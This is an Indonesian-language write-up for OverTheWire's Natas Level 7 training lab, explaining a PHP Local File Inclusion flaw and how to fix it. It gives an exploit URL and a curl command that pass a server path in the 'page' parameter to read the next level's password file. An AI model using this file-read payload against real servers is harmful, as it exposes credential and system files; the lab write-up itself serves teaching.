---
title: "Level 7"
description: Exploitasi Local File Inclusion untuk membaca file server.
sidebarTitle: "Level 7 — Local File Inclusion"
---

## Profil

- **Target:** `http://natas7.natas.labs.overthewire.org`
- **Kredensial:** `natas7` / (password dari Level 6)

## Pengintaian

Halaman berisi dua tautan "Home" dan "About". URL mengungkapkan parameter:

```
index.php?page=home
index.php?page=about
```

Ini menunjukkan bahwa parameter `page` diteruskan ke fungsi `include()` atau `require()` PHP — pola Local File Inclusion (LFI) klasik.

## Analisis

Ketika aplikasi menggunakan input pengguna untuk membangun path file tanpa sanitasi yang tepat, penyerang dapat membaca file arbitrer.

## Eksploitasi

Modifikasi parameter `page` untuk menunjuk ke file password:

```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

Server meng-include file langsung ke dalam respons, membocorkan isinya. Dengan curl:

```bash
curl -u natas7:$(cat password7) \
  "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
```

## Remediasi

- Jangan pernah memberikan input pengguna langsung ke `include()` atau fungsi filesystem
- Gunakan whitelist nilai halaman yang diizinkan
- Nonaktifkan fungsi PHP berbahaya jika tidak diperlukan
